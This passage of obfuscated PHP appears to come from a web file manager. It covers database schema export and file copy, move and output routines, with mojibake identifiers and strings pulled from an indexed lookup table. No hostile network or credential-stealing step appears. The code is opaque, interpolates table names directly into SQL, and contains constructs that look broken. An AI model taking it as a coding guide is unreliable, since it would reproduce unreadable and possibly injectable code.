"\104\x52\117\120\40\x54\x41\x42\114\x45\40\111\106\x20\105\130\x49\123\x54\x53\40\140{$ ÅÉ‡½°}\140\73" . PHP_EOL . $„–Èç‚¶ . $¤ì¥¢Š[71]; if ($á€öò¬Ø && $á€öò¬Ø == $¤ì¥¢Š[805]) { return $æó»ŞØÁ; } $“ÉßŞ·ú = array_change_key_case($GLOBALS[$¤ì¥¢Š[6]][$¤ì¥¢Š[21]]); $õ¿îµ¼ï = $“ÉßŞ·ú[$¤ì¥¢Š[968]]; $©®Ÿ“©’ = $¤ì¥¢Š[1094] . $õ¿îµ¼ï . $¤ì¥¢Š[1095] . $ ÅÉ‡½° . $¤ì¥¢Š[58]; $¥ïàŸ—Î = $¤ì¥¢Š[1096] . $ ÅÉ‡½° . $¤ì¥¢Š[896]; $ëÀ‘‰Ñ = $Ê®ÃœŒï->query($©®Ÿ“©’); if (empty($ëÀ‘‰Ñ)) { $ëêÙò«¾ = array($¤ì¥¢Š[805] => $¤ì¥¢Š[12], $¤ì¥¢Š[13] => $¤ì¥¢Š[12]); return $á€öò¬Ø ? $ëêÙò«¾[$á€öò¬Ø] : $ëêÙò«¾; } $Çø×Ğ  = $Ê®ÃœŒï->query($¥ïàŸ—Î); $ºÚ´ŸÁ = $¤ì¥¢Š[12]; $¤İ ¸®„ = array(); foreach ($Çø×Ğ  as $ä‹öš¶ ) { if (!$ºÚ´ŸÁ && $ä‹öš¶ [$¤ì¥¢Š[1097]] == $¤ì¥¢Š[1098]) { $ºÚ´ŸÁ = $ä‹öš¶ [$¤ì¥¢Š[1099]]; } if (isset($¤İ ¸®„[$ä‹öš¶ [$¤ì¥¢Š[1097]]])) { $¤İ ¸®„[$ä‹öš¶ [$¤ì¥¢Š[1097]]][$¤ì¥¢Š[1100]][] = $ä‹öš¶ [$¤ì¥¢Š[1099]]; continue; } $¤İ ¸®„[$ä‹öš¶ [$¤ì¥¢Š[1097]]] = array($¤ì¥¢Š[1101] => $ä‹öš¶ [$¤ì¥¢Š[1097]], $¤ì¥¢Š[1100] => array($ä‹öš¶ [$¤ì¥¢Š[1099]]), $¤ì¥¢Š[1102] => $ä‹öš¶ [$¤ì¥¢Š[1103]] == $¤ì¥¢Š[89] ? 0 : 1); } $¸¢¼€£Š = array(); foreach ($¤İ ¸®„ as $ä‹öš¶ ) { $½„“ÜÏ½ = $ä‹öš¶ [$¤ì¥¢Š[1101]] == $¤ì¥¢Š[1098]; $¸¤ Õ±ø = array($¤ì¥¢Š[1104], $ä‹öš¶ [$¤ì¥¢Š[1102]] == $¤ì¥¢Š[89] && !$½„“ÜÏ½ ? $¤ì¥¢Š[1105] : $¤ì¥¢Š[12], $¤ì¥¢Š[1106], $¤ì¥¢Š[1107] . $ ÅÉ‡½° . $¤ì¥¢Š[11] . ($½„“ÜÏ½ ? $¤ì¥¢Š[1108] : $ä‹öš¶ [$¤ì¥¢Š[1101]]) . $¤ì¥¢Š[117], $¤ì¥¢Š[1109], $¤ì¥¢Š[117] . $ ÅÉ‡½° . $¤ì¥¢Š[117], $¤ì¥¢Š[1110] . implode($¤ì¥¢Š[1111], $ä‹öš¶ [$¤ì¥¢Š[1100]]) . $¤ì¥¢Š[1112]); $¸¢¼€£Š[] = implode($¤ì¥¢Š[53], $¸¤ Õ±ø) . $¤ì¥¢Š[71]; } $·Œ úäÓ = array(); $ˆŒìÁÉÎ = array($¤ì¥¢Š[1113] => $¤ì¥¢Š[1114], $¤ì¥¢Š[1114] => $¤ì¥¢Š[1114], $¤ì¥¢Š[283] => $¤ì¥¢Š[310], $¤ì¥¢Š[282] => $¤ì¥¢Š[310]); foreach ($ëÀ‘‰Ñ as $ä‹öš¶ ) { $¸¤ Õ±ø = array($¤ì¥¢Š[117] . $ä‹öš¶ [$¤ì¥¢Š[1115]] . $¤ì¥¢Š[117], isset($ˆŒìÁÉÎ[$ä‹öš¶ [$¤ì¥¢Š[1116]]]) ? $ˆŒìÁÉÎ[$ä‹öš¶ [$¤ì¥¢Š[1116]]] : $ä‹öš¶ [$¤ì¥¢Š[1117]], $ä‹öš¶ [$¤ì¥¢Š[1118]] == $¤ì¥¢Š[894] ? $¤ì¥¢Š[1119] : $¤ì¥¢Š[1120], $ä‹öš¶ [$¤ì¥¢Š[1115]] == $ºÚ´ŸÁ ? $¤ì¥¢Š[1121] : $¤ì¥¢Š[12], $ä‹öš¶ [$¤ì¥¢Š[945]] ? strtoupper(str_replace($¤ì¥¢Š[11], $¤ì¥¢Š[12], $ä‹öš¶ [$¤ì¥¢Š[945]])) : $¤ì¥¢Š[12]); $·Œ úäÓ[] = trim(implode($¤ì¥¢Š[53], $¸¤ Õ±ø)); } $ıĞÄüŒÅ = array($¤ì¥¢Š[1122] . $ ÅÉ‡½° . $¤ì¥¢Š[1123], $¤ì¥¢Š[1124] . $ ÅÉ‡½° . $¤ì¥¢Š[1125], implode($¤ì¥¢Š[50] . PHP_EOL, $·Œ úäÓ), $¤ì¥¢Š[942]); $ôÄ±ì© = implode(PHP_EOL, array_merge($ıĞÄüŒÅ, $¸¢¼€£Š)); if ($á€öò¬Ø && $á€öò¬Ø == $¤ì¥¢Š[13]) { return $ôÄ±ì©; } $ëêÙò«¾ = array($¤ì¥¢Š[805] => $æó»ŞØÁ, $¤ì¥¢Š[13] => $ôÄ±ì©); return $á€öò¬Ø ? $ëêÙò«¾[$á€öò¬Ø] : $ëêÙò«¾; } public function sqlFromSqlite($Øğù–ŠÃ, $”Æ½¸€­ = '') { $ôœ•˜¶© =& $_SERVER[Ãìšã«™]; $ÙäéÓµº = $this->model()->db(); $‰‡ƒ = "\x50\122\101\x47\115\101\40\124\x41\102\x4c\x45\x5f\111\x4e\106\x4f\40\50\x27{$Øğù–ŠÃ}\x27\x29"; $Ò±çÜÙü = "\123\105\114\105\103\x54\40\x2a\40\x46\x52\117\x4d\x20\x73\161\154\151\x74\x65\137\155\x61\163\164\x65\x72\40\x57\110\105\122\105\x20\164\x62\x6c\137\156\141\155\x65\x20\x3d\x20\x27{$Øğù–ŠÃ}\x27"; $Ø•–ß— = $ÙäéÓµº->query($‰‡ƒ); if (empty($Ø•–ß—)) { $ß¯‰½º = array($ôœ•˜¶©[805] => $ôœ•˜¶©[12], $ôœ•˜¶©[13] => $ôœ•˜¶©[12]); return $”Æ½¸€­ ? $ß¯‰½º[$”Æ½¸€­] : $ß¯‰½º; } $„²•°Ç„ = $ÙäéÓµº->query($Ò±çÜÙü); $ñéÇÅŒš = $¡Ùûòî = array(); foreach ($„²•°Ç„ as $™ÔÓÂå) { if ($™ÔÓÂå[$ôœ•˜¶©[33]] == $ôœ•˜¶©[274]) { $ñéÇÅŒš[] = $™ÔÓÂå[$ôœ•˜¶©[1126]]; } else { $¡Ùûòî[$™ÔÓÂå[$ôœ•˜¶©[32]]] = $™ÔÓÂå[$ôœ•˜¶©[1126]]; } } $ÑõÒÑ‰ = array_merge(array($ôœ•˜¶©[1122] . $Øğù–ŠÃ . $ôœ•˜¶©[117]), $ñéÇÅŒš, array_values($¡Ùûòî)); $ÑõÒÑ‰ = implode($ôœ•˜¶©[71] . PHP_EOL, $ÑõÒÑ‰) . $ôœ•˜¶©[71]; if ($”Æ½¸€­ && $”Æ½¸€­ == $ôœ•˜¶©[13]) { return $ÑõÒÑ‰; } $–‘ô‚Ö = array(); $êğ¥Âè = array($ôœ•˜¶©[1114] => $ôœ•˜¶©[1127], $ôœ•˜¶©[310] => $ôœ•˜¶©[1128]); $ú—œ¾ñù = $ôœ•˜¶©[12]; foreach ($Ø•–ß— as $™ÔÓÂå) { if ($™ÔÓÂå[$ôœ•˜¶©[57]] == $ôœ•˜¶©[89]) { $ú—œ¾ñù = $™ÔÓÂå[$ôœ•˜¶©[32]]; } $»ëè‚ƒÉ = array($ôœ•˜¶©[380] . $™ÔÓÂå[$ôœ•˜¶©[32]] . $ôœ•˜¶©[380], isset($êğ¥Âè[$™ÔÓÂå[$ôœ•˜¶©[33]]]) ? $êğ¥Âè[$™ÔÓÂå[$ôœ•˜¶©[33]]] : $™ÔÓÂå[$ôœ•˜¶©[33]], $™ÔÓÂå[$ôœ•˜¶©[35]] == $ôœ•˜¶©[89] ? $ôœ•˜¶©[1119] : $ôœ•˜¶©[1129] . $™ÔÓÂå[$ôœ•˜¶©[56]], $™ÔÓÂå[$ôœ•˜¶©[57]] == $ôœ•˜¶©[89] ? $ôœ•˜¶©[1130] : $ôœ•˜¶©[12]); $–‘ô‚Ö[] = trim(implode($ôœ•˜¶©[53], $»ëè‚ƒÉ)); } foreach ($¡Ùûòî as $ÑûÂåÛŒ => $İŠŸÃØÏ) { $¿á¶­€ = str_replace($ôœ•˜¶©[1131] . $Øğù–ŠÃ . $ôœ•˜¶©[11], $ôœ•˜¶©[12], $ÑûÂåÛŒ); $Å•ş×È = str_replace(array($ôœ•˜¶©[117], $ôœ•˜¶©[953]), $ôœ•˜¶©[380], substr($İŠŸÃØÏ, stripos($İŠŸÃØÏ, $ôœ•˜¶©[255]))); if ($¿á¶­€ == $ôœ•˜¶©[1108]) { $ƒ™À×ŞÈ = $ôœ•˜¶©[1132] . $ú—œ¾ñù . $ôœ•˜¶©[1133]; } else { $ƒ™À×ŞÈ = (stripos($¿á¶­€, $ôœ•˜¶©[11]) ? $ôœ•˜¶©[1134] : $ôœ•˜¶©[12]) . ($ôœ•˜¶©[1135] . $¿á¶­€ . $ôœ•˜¶©[1136] . $Å•ş×È); } $–‘ô‚Ö[] = $ƒ™À×ŞÈ; } $°¨—É”ç = array($ôœ•˜¶©[1137] . $Øğù–ŠÃ . $ôœ•˜¶©[1138], $ôœ•˜¶©[1139] . $Øğù–ŠÃ . $ôœ•˜¶©[1140], implode($ôœ•˜¶©[50] . PHP_EOL, $–‘ô‚Ö), $ôœ•˜¶©[1141]); $ëš¸÷Íõ = implode(PHP_EOL, $°¨—É”ç); if ($”Æ½¸€­ && $”Æ½¸€­ == $ôœ•˜¶©[805]) { return $ëš¸÷Íõ; } $ß¯‰½º = array($ôœ•˜¶©[805] => $ëš¸÷Íõ, $ôœ•˜¶©[13] => $ÑõÒÑ‰); return $”Æ½¸€­ ? $ß¯‰½º[$”Æ½¸€­] : $ß¯‰½º; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ĞÁ‡õßø, $¼÷®­İ) { $ê¶ğ¼Ñ” =& $_SERVER[Ãìšã«™]; $¶æ´»ıÑ = $¼÷®­İ; $GLOBALS[$ê¶ğ¼Ñ”[1142]] = $ê¶ğ¼Ñ”[1143] . $ĞÁ‡õßø; Hook::trigger($ê¶ğ¼Ñ”[1143] . $ĞÁ‡õßø . $ê¶ğ¼Ñ”[1144], $¶æ´»ıÑ); $¨³ïÇ = self::driverMake($¼÷®­İ[0]); if (!$¨³ïÇ) { return !1; } if (method_exists($¨³ïÇ, $ĞÁ‡õßø)) { $õåâ´àÁ = @call_user_func_array(array($¨³ïÇ, $ĞÁ‡õßø), $¼÷®­İ); } else { if (method_exists($¨³ïÇ, $ê¶ğ¼Ñ”[1145])) { $õåâ´àÁ = @call_user_func_array(array($¨³ïÇ, $ĞÁ‡õßø), $¼÷®­İ); } else { if (method_exists(self, $ĞÁ‡õßø)) { $õåâ´àÁ = @call_user_func_array(array(self, $ĞÁ‡õßø), $¼÷®­İ); } else { $õåâ´àÁ = call_user_func_array(array(parent, $ĞÁ‡õßø), $¼÷®­İ); } } } Hook::trigger($ê¶ğ¼Ñ”[1143] . $ĞÁ‡õßø . $ê¶ğ¼Ñ”[1146], $¶æ´»ıÑ, $õåâ´àÁ); return $õåâ´àÁ; } public static function init($§‡Ï¡úÍ) { return self::driverMake($§‡Ï¡úÍ); } public static function copy($‰Ş°ÒĞš, $ÅøÇ··Í, $”¿úƒ¨ = false, $ÑÂìØÉË = false) { return self::copyMoveStart($‰Ş°ÒĞš, $ÅøÇ··Í, $”¿úƒ¨, $_SERVER[Ãìšã«™][549], $ÑÂìØÉË); } public static function move($¬ÊŠ±è, $È†Ú×Âã, $æ—çŸ›Â = false, $ôè¢Äºİ = false) { return self::copyMoveStart($¬ÊŠ±è, $È†Ú×Âã, $æ—çŸ›Â, $_SERVER[Ãìšã«™][551], $ôè¢Äºİ); } private static function copyMoveStart($ïëò²›, $Ù°ûÊØ, $½“üª®‚, $íø³§ÜÅ, $ˆôÑËˆé) { $ÌÜ° =& $_SERVER[Ãìšã«™]; $‹è‘ó¸È = array($ïëò²›, $Ù°ûÊØ, $½“üª®‚, $ˆôÑËˆé); Hook::trigger($ÌÜ°[1143] . $íø³§ÜÅ . $ÌÜ°[1144], $‹è‘ó¸È); $É¼êÂÖÎ = self::copyMove($ïëò²›, $Ù°ûÊØ, $½“üª®‚, $íø³§ÜÅ, $ˆôÑËˆé); Hook::trigger($ÌÜ°[1143] . $íø³§ÜÅ . $ÌÜ°[1146], $‹è‘ó¸È, $É¼êÂÖÎ); return $É¼êÂÖÎ; } public static function saveFile($­’Á¯Èó, $ÓëÚî†–, $”‡ú•Å = true) { $Â²û“ëÂ =& $_SERVER[Ãìšã«™]; $®ÂŞ÷¥ = self::info($ÓëÚî†–); $éË‰ÃÛ· = self::driverMake($­’Á¯Èó); $¬íÌëå = self::driverMake($ÓëÚî†–); $¢™œ–˜Ô = !1; if ($¬íÌëå->pathParse[$Â²û“ëÂ[1147]]) { $¢™œ–˜Ô = $¬íÌëå; $²÷ºüó = $¬íÌëå->pathParse[$Â²û“ëÂ[1147]]; $¬íÌëå = self::driverMake($²÷ºüó); } if ($éË‰ÃÛ·->pathParse[$Â²û“ëÂ[1147]]) { $¹€²ÅáÜ = $éË‰ÃÛ·->pathParse[$Â²û“ëÂ[1147]]; $éË‰ÃÛ· = self::driverMake($¹€²ÅáÜ); } $Ù­î¾ = $¬íÌëå->pathFather($ÓëÚî†–); $š˜÷¦ò = !0; if (!$”‡ú•Å && self::driverIsSame($éË‰ÃÛ·, $¬íÌëå)) { $š˜÷¦ò = !1; } $·÷€…îÜ = self::copyFile($éË‰ÃÛ·, $­’Á¯Èó, $¬íÌëå, $Ù­î¾, $®ÂŞ÷¥[$Â²û“ëÂ[32]], $š˜÷¦ò); if ($¢™œ–˜Ô) { $·÷€…îÜ = $¢™œ–˜Ô->getPathOuter($·÷€…îÜ); } return $·÷€…îÜ; } private static function copyMove($ƒÓƒæŒ±, $î¢ïúò¼, $¼¹Á·Ãì, $ôó¬¼×, $êåœŸ£š = false) { $ÀÀò¶òï =& $_SERVER[Ãìšã«™]; if (!$ƒÓƒæŒ± || $ƒÓƒæŒ± == $ÀÀò¶òï[8] || !$î¢ïúò¼) { return !1; } ignore_timeout(); $©çÒû€ğ = self::driverMake($ƒÓƒæŒ±); $›§ÃÚ°ƒ = self::driverMake($î¢ïúò¼); $ÚôÜÒ´Ï = $ôó¬¼× == $ÀÀò¶òï[551]; $’¤â ıó = !1; if ($›§ÃÚ°ƒ->pathParse[$ÀÀò¶òï[1147]]) { $’¤â ıó = $›§ÃÚ°ƒ; $î¢ïúò¼ = $›§ÃÚ°ƒ->pathParse[$ÀÀò¶òï[1147]]; $›§ÃÚ°ƒ = self::driverMake($î¢ïúò¼); } if ($©çÒû€ğ->pathParse[$ÀÀò¶òï[1147]]) { $ƒÓƒæŒ± = $©çÒû€ğ->pathParse[$ÀÀò¶òï[1147]]; $©çÒû€ğ = self::driverMake($ƒÓƒæŒ±); } self::check($©çÒû€ğ, $ƒÓƒæŒ±, $›§ÃÚ°ƒ, $î¢ïúò¼); Hook::trigger($ÀÀò¶òï[75], $©çÒû€ğ, $ƒÓƒæŒ±, $›§ÃÚ°ƒ, $î¢ïúò¼); $Äºå«¡ = self::driverIsSame($©çÒû€ğ, $›§ÃÚ°ƒ); if ($Äºå«¡) { if ($ôó¬¼× == $ÀÀò¶òï[551] && !method_exists($›§ÃÚ°ƒ, $ÀÀò¶òï[1148]) && trim($î¢ïúò¼, $ÀÀò¶òï[8]) == trim($›§ÃÚ°ƒ->pathFather($ƒÓƒæŒ±), $ÀÀò¶òï[8])) { if ($©çÒû€ğ->pathThis($ƒÓƒæŒ±) != $êåœŸ£š && !$©çÒû€ğ->isTypeObject()) { return $©çÒû€ğ->rename($ƒÓƒæŒ±, $êåœŸ£š); } return $›§ÃÚ°ƒ->getPathOuter($ƒÓƒæŒ±); } if (method_exists($›§ÃÚ°ƒ, $ôó¬¼×)) { return $›§ÃÚ°ƒ->{$ôó¬¼×}($ƒÓƒæŒ±, $î¢ïúò¼, $¼¹Á·Ãì, $êåœŸ£š); } } if ($Äºå«¡ && $ôó¬¼× == $ÀÀò¶òï[551] && $›§ÃÚ°ƒ->getType() == $ÀÀò¶òï[107]) { $ãÊöÔ¥ = $›§ÃÚ°ƒ->movePath($ƒÓƒæŒ±, $î¢ïúò¼, $êåœŸ£š); if ($ãÊöÔ¥) { return $ãÊöÔ¥; } } $´ÃÄµè¤ = $©çÒû€ğ->isFile($ƒÓƒæŒ±); if (!$´ÃÄµè¤ && $›§ÃÚ°ƒ->getType() == $ÀÀò¶òï[759] && $©çÒû€ğ->getType() == $ÀÀò¶òï[107]) { $ãÊöÔ¥ = $›§ÃÚ°ƒ->copyFolderFromIO($©çÒû€ğ, $ƒÓƒæŒ±, $î¢ïúò¼, $¼¹Á·Ãì, $ÚôÜÒ´Ï, $êåœŸ£š); } else { $ãÊöÔ¥ = self::copyPath($©çÒû€ğ, $ƒÓƒæŒ±, $›§ÃÚ°ƒ, $î¢ïúò¼, $¼¹Á·Ãì, $ÚôÜÒ´Ï, $´ÃÄµè¤, $êåœŸ£š); } if ($ãÊöÔ¥ && $ÚôÜÒ´Ï) { $©çÒû€ğ->remove($ƒÓƒæŒ±); } if ($’¤â ıó) { $ãÊöÔ¥ = $’¤â ıó->getPathOuter($ãÊöÔ¥); } return $ãÊöÔ¥; } private static function check($œ´ì™ñ, $´­Ã³ë, $÷÷ÔÆæÍ, &$ìÖığã) { $³Ã×½ =& $_SERVER[Ãìšã«™]; if (self::driverIsSame($œ´ì™ñ, $÷÷ÔÆæÍ) && $œ´ì™ñ->isFolder($´­Ã³ë) && $œ´ì™ñ->isParentOf($´­Ã³ë, $ìÖığã)) { show_json(LNG($³Ã×½[1149]), !1); } if (!$œ´ì™ñ->exist($´­Ã³ë)) { show_json(LNG($³Ã×½[106]), !1); } } private static function copyPath($Ë¤½òõ, $±ª»„ã, $àçç·à, $ãîô´Š, $Ê§˜‚, $ëÄ¾Å£æ, $µ ªì°, $³´Ò„à¤ = false) { $âüü›½­ =& $_SERVER[Ãìšã«™]; $‹‚Ó…¹ = empty($³´Ò„à¤) && $³´Ò„à¤ !== $âüü›½­[190] ? $Ë¤½òõ->pathThis($±ª»„ã) : $³´Ò„à¤; if ($Ê§˜‚) { $å™Õœ¤™ = $àçç·à->fileNameExist($ãîô´Š, $‹‚Ó…¹); $‹‚Ó…¹ = $àçç·à->fileNameAuto($ãîô´Š, $‹‚Ó…¹, $Ê§˜‚, !$µ ªì°); $Ê§˜‚ = $å™Õœ¤™ ? $Ê§˜‚ : !1; } if ($µ ªì°) { return self::copyFile($Ë¤½òõ, $±ª»„ã, $àçç·à, $ãîô´Š, $‹‚Ó…¹, $ëÄ¾Å£æ); } if ($Ê§˜‚ == REPEAT_RENAME_FOLDER) { $Ê§˜‚ = !1; } $Ş³åÜóÅ = rtrim($ãîô´Š, $âüü›½­[8]) . $âüü›½­[8] . $‹‚Ó…¹; $–Ù¤ï«á = $àçç·à->mkdir($àçç·à->getPath($Ş³åÜóÅ)); $ãîô´Š = $àçç·à->getPathInner($–Ù¤ï«á); $€´Ê¬æÔ = $Ë¤½òõ->listPath($±ª»„ã, !0); $€´Ê¬æÔ = is_array($€´Ê¬æÔ) ? $€´Ê¬æÔ : array($âüü›½­[76] => array(), $âüü›½­[77] => array()); $ ”ô = array_merge($€´Ê¬æÔ[$âüü›½­[76]], $€´Ê¬æÔ[$âüü›½­[77]]); foreach ($ ”ô as $ı´â¶´‘) { $Å£“À¸¯ = $ı´â¶´‘[$âüü›½­[33]] == $âüü›½­[192]; $±ª»„ã = $Ë¤½òõ->getPathInner($ı´â¶´‘[$âüü›½­[78]]); $®÷•¹ĞĞ = self::copyPath($Ë¤½òõ, $±ª»„ã, $àçç·à, $ãîô´Š, $Ê§˜‚, $ëÄ¾Å£æ, $Å£“À¸¯); if (!$®÷•¹ĞĞ) { IO::errorTips($âüü›½­[1150] . $±ª»„ã . $âüü›½­[70] . $ãîô´Š); } } self::copyMoveKeepInfo($Ë¤½òõ, $±ª»„ã, $–Ù¤ï«á); return $–Ù¤ï«á; } private static function copyFile($ä·ÂÊ¯°, $õïŸç©¿, $…¢Ãƒ’á, $…Êİò·, $ªû™ÎŸŠ, $å³–ğÃí) { $ëëÇƒ¼ =& $_SERVER[Ãìšã«™]; $…Êİò· = $…¢Ãƒ’á->getPath(rtrim($…Êİò·, $ëëÇƒ¼[8]) . $ëëÇƒ¼[8] . $ªû™ÎŸŠ); $ûï½è¢Æ = $ëëÇƒ¼[1151] . time() . rand_string(5); Hook::trigger($ëëÇƒ¼[1152], $ä·ÂÊ¯°, $õïŸç©¿, $…¢Ãƒ’á, $…Êİò·, $ªû™ÎŸŠ, $ûï½è¢Æ); if (self::driverIsSame($ä·ÂÊ¯°, $…¢Ãƒ’á)) { if ($å³–ğÃí) { $ªëÍê»® = $…¢Ãƒ’á->moveFile($õïŸç©¿, $…Êİò·); } else { $ªëÍê»® = $…¢Ãƒ’á->copyFile($õïŸç©¿, $…Êİò·); } Hook::trigger($ëëÇƒ¼[1153], $ä·ÂÊ¯°, $õïŸç©¿, $…¢Ãƒ’á, $…Êİò·, $ªû™ÎŸŠ, $ªëÍê»®); self::copyMoveKeepInfo($ä·ÂÊ¯°, $õïŸç©¿, $ªëÍê»®); return $ªëÍê»®; } $ùö€“Ğ = TEMP_FILES; if ($GLOBALS[$ëëÇƒ¼[6]][$ëëÇƒ¼[90]][$ëëÇƒ¼[797]]) { $ùö€“Ğ = $GLOBALS[$ëëÇƒ¼[6]][$ëëÇƒ¼[90]][$ëëÇƒ¼[797]]; } $Ô®—ù  = $ùö€“Ğ; mk_dir($Ô®—ù ); $ö°Æ…Ó¤ = $Ô®—ù  . $ûï½è¢Æ; $øÎ¨êà€ = $ö°Æ…Ó¤; $ö°Æ…Ó¤ = $ä·ÂÊ¯°->download($õïŸç©¿, $ö°Æ…Ó¤); $ö°Æ…Ó¤ = $ä·ÂÊ¯°->iconvApp($ö°Æ…Ó¤); if (substr($ö°Æ…Ó¤, strlen($ùö€“Ğ)) == $ùö€“Ğ) { $å³–ğÃí = !0; } $ªëÍê»® = $…¢Ãƒ’á->upload($…Êİò·, $ö°Æ…Ó¤, $å³–ğÃí); self::remove($øÎ¨êà€); Hook::trigger($ëëÇƒ¼[1153], $ä·ÂÊ¯°, $õïŸç©¿, $…¢Ãƒ’á, $…Êİò·, $ªû™ÎŸŠ, $ªëÍê»®); self::copyMoveKeepInfo($ä·ÂÊ¯°, $õïŸç©¿, $ªëÍê»®); return $ªëÍê»®; } private static function copyMoveKeepInfo($ä™éêáâ, $Ù‡Ò¦Äí, $ÃÈûò¾¹) { if (!$ÃÈûò¾¹) { return; } $…¤‡‹”° = $ä™éêáâ->info($Ù‡Ò¦Äí); if (!is_array($…¤‡‹”°)) { return; } IO::setModifyTime($ÃÈûò¾¹, $…¤‡‹”°[$_SERVER[Ãìšã«™][86]]); } public static function pathFather($Õøï·‘) { $è‹¼ÊÎ = IO::init($Õøï·‘); $¤Ò¢ı¯ˆ = $è‹¼ÊÎ->pathFather($è‹¼ÊÎ->path); return $è‹¼ÊÎ->getPathOuter($¤Ò¢ı¯ˆ); } public static function fileOut($®”½†Ó¹, $Óãæª¿ = false, $®ÓóŸÛé = false, $‰ŞÔæ†® = '') { $èèî±Ñõ = self::driverMake($®”½†Ó¹); if ($èèî±Ñõ->isFileOutServer()) { return $èèî±Ñõ->fileOutServer($®”½†Ó¹, $Óãæª¿, $®ÓóŸÛé, $‰ŞÔæ†®); } return $èèî±Ñõ->fileOut($®”½†Ó¹, $Óãæª¿, $®ÓóŸÛé, $‰ŞÔæ†®); } public static function fileOutImage($ìßéî’, $©ƒ¸¤ = 250) { $¼˜›× = array(250, 600, 1200, 2000, 3000, 5000); for ($Å®óÒªñ = 0; $Å®óÒªñ < count($¼˜›×); $Å®óÒªñ++) { if ($Å®óÒªñ == 0 && $©ƒ¸¤ <= $¼˜›×[$Å®óÒªñ]) { $©ƒ¸¤ = $¼˜›×[$Å®óÒªñ]; break; } else { if ($©ƒ¸¤ > $¼˜›×[$Å®óÒªñ - 1] && $©ƒ¸¤ <= $¼˜›×[$Å®óÒªñ]) { $©ƒ¸¤ = $¼˜›×[$Å®óÒªñ]; break; } else { if ($Å®óÒªñ == count($¼˜›×) - 1 && $©ƒ¸¤ > $¼˜›×[$Å®óÒªñ]) { $©ƒ¸¤ = $¼˜›×[$Å®óÒªñ]; break; } } } } $™’ÚÛ³ = self::driverMake($ìßéî’); if ($™’ÚÛ³->isFileOutServer()) { return $™’ÚÛ³->fileOutImageServer($ìßéî’, $©ƒ¸¤); } return $™’ÚÛ³->fileOutImage($ìßéî’, $©ƒ¸¤); } private static function driverIsSame($£Œ«º•ñ, $ê¨Ü‚§é) { $ıŞ¸ù¡’ =& $_SERVER[Ãìšã«™]; $°Æ–Œƒ = $£Œ«º•ñ->getType(); $ÊµÉÓâˆ = $ê¨Ü‚§é->getType(); if ($°Æ–Œƒ != $ÊµÉÓâˆ) { return !1; } if ($°Æ–Œƒ == $ıŞ¸ù¡’[759]) { return !0; } if ($°Æ–Œƒ == $ıŞ¸ù¡’[107]) { return !0; } if ($£Œ«º•ñ->pathDriver == $ê¨Ü‚§é->pathDriver) { return !0; } return !1; } public static function copyUpdate($öá˜í´, $Á²È‡¨) { $×Ï’ËÅÀ =& $_SERVER[Ãìšã«™]; if (!IO::exist($öá˜í´)) { return !1; } if (!IO::exist($Á²È‡¨)) { IO::mkdir($Á²È‡¨); } $æ¸ª€ÚÇ = self::_listAll($öá˜í´); $½Çé®Å– = self::_listAll($Á²È‡¨); $¡áëïâ = array(); $Úƒûƒ—  = array(); foreach ($æ¸ª€ÚÇ as $şşßÑÅ => $ãÄú­Ù) { if (isset($½Çé®Å–[$şşßÑÅ])) { if ($ãÄú­Ù[$×Ï’ËÅÀ[79]] == 1) { continue; } if ($½Çé®Å–[$şşßÑÅ][$×Ï’ËÅÀ[80]] == $ãÄú­Ù[$×Ï’ËÅÀ[80]]) { continue; } } if ($ãÄú­Ù[$×Ï’ËÅÀ[79]] == 1) { $Úƒûƒ— [] = $Á²È‡¨ . $×Ï’ËÅÀ[8] . $şşßÑÅ; continue; } $áòøÅ­‰ = strstr(trim($şşßÑÅ, $×Ï’ËÅÀ[8]), $×Ï’ËÅÀ[8]) ? get_path_father($şşßÑÅ) : $×Ï’ËÅÀ[12]; $¡áëïâ[] = array($×Ï’ËÅÀ[1154] => $ãÄú­Ù[$×Ï’ËÅÀ[78]], $×Ï’ËÅÀ[1155] => rtrim($Á²È‡¨, $×Ï’ËÅÀ[8]) . $×Ï’ËÅÀ[8] . $áòøÅ­‰, $×Ï’ËÅÀ[1156] => $ãÄú­Ù); } $€Ôéõ´ı = array($×Ï’ËÅÀ[192] => $¡áëïâ, $×Ï’ËÅÀ[79] => $Úƒûƒ— ); Hook::trigger($×Ï’ËÅÀ[1157], $öá˜í´, $Á²È‡¨, $€Ôéõ´ı); foreach ($Úƒûƒ—  as $ãÄú­Ù) { IO::mkdir($ãÄú­Ù); } foreach ($¡áëïâ as $ãÄú­Ù) { IO::copy($ãÄú­Ù[$×Ï’ËÅÀ[1154]], $ãÄú­Ù[$×Ï’ËÅÀ[1155]], REPEAT_REPLACE); } } private static function _listAll($¾†Í·¥œ) { $ßÚÖñÀ¡ =& $_SERVER[Ãìšã«™]; $¾†Í·¥œ = KodIO::clear($¾†Í·¥œ); $ÆÁ¯Ê½ = IO::listAll($¾†Í·¥œ); foreach ($ÆÁ¯Ê½ as &$æ’…·€‹) { $Ôêô«´ = substr($æ’…·€‹[$ßÚÖñÀ¡[78]], strlen($¾†Í·¥œ)); $æ’…·€‹[$ßÚÖñÀ¡[1158]] = trim($Ôêô«´, $ßÚÖñÀ¡[8]); } unset($æ’…·€‹); return array_to_keyvalue($ÆÁ¯Ê½, $ßÚÖñÀ¡[1158]); } public static function fileSubstr($®ãÅûÄ, $ºÊ›¥Ø¦, $€í†êéü = false) { $ÁäŒŠ¨Ğ =& $_SERVER[Ãìšã«™]; $øØ’Õ™¢ = self::driverMake($®ãÅûÄ); $Ô’ˆí = $øØ’Õ™¢->size($®ãÅûÄ); $ÃÁÛÑ×– = $ºÊ›¥Ø¦; $üìµ­† = $€í†êéü; if ($ºÊ›¥Ø¦ < 0) { $ºÊ›¥Ø¦ = $Ô’ˆí + $ºÊ›¥Ø¦; } if ($€í†êéü === !1) { $€í†êéü = $Ô’ˆí - $ºÊ›¥Ø¦; } if ($ºÊ›¥Ø¦ + $€í†êéü > $Ô’ˆí) { $€í†êéü = $Ô’ˆí - $ºÊ›¥Ø¦; } if (!$Ô’ˆí && $øØ’Õ™¢->getType() == $ÁäŒŠ¨Ğ[107] && !$øØ’Õ™¢->exist($®ãÅûÄ)) { throw new Exception($ÁäŒŠ¨Ğ[1159] . LNG($ÁäŒŠ¨Ğ[1160]) . $ÁäŒŠ¨Ğ[962] . get_path_this($®ãÅûÄ) . $ÁäŒŠ¨Ğ[12]); } if ($€í†êéü <= 0) { return $ÁäŒŠ¨Ğ[12]; } if ($ºÊ›¥Ø¦ < 0 || $ºÊ›¥Ø¦ >= $Ô’ˆí || $€í†êéü > 1024 * 1024 